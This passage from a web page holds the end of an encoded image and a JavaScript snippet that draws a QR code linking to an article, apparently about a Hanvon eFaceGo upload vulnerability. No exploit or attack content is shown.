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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-updateVisitorMapConfig-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 